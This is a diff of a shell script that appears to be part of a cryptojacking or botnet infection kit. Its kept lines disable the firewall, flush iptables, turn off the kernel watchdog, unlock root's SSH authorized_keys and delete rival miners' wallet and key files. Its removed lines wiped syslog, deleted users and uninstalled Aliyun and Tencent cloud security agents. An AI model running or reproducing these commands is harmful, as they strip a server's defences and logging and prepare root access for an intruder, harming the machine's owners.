@@ -1,20 +1,11 @@
 ulimit -n 65535
 
-rm -rf /var/log/syslog
-chattr -iua /tmp/
-chattr -iua /var/tmp/
-
 ufw disable
 iptables -F
 
-echo "nope" >/tmp/log_rot
-
-sudo sysctl kernel.nmii_watchdog=0
+sudo sysctl kernel.nmi_watchdog=0
 echo '0'>/proc/sys/kernel/nmi_watchdog
 echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf
-
-userdel akay
-userdel vfinder
 
 chattr -iae /root/.ssh/
 chattr -iae /root/.ssh/authorized_keys
@@ -22,22 +13,4 @@ chattr -iae /root/.ssh/authorized_keys
 rm -rf /tmp/addres*
 rm -rf /tmp/walle*
 rm -rf /tmp/keys
-
-if ps aux | grep -i '[a]liyun'; then
-#curl http://update.aegis.aliyun.com/download/unistall.sh | bash
-#curl http://update.aegis.aliyun.com/download/quartz_unistall.sh
-pkill aliyun-service
-rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
-rm -rf /usr/local/aegis*
-systemctl stop aliyun.service
-systemctl disable aliyun.service
-service bcm-agent -y
-apt-get remove bcm-agent -y
-
-elif ps aux | grep -i '[y]unjing'; then
-/usr/local/qcloud/stargate/admin/unistall.sh
-/usr/local/qcloud/YunJing/unist.sh
-/usr/local/qcloud/monitor/barad/admin/unistall.sh
-fi
-
 
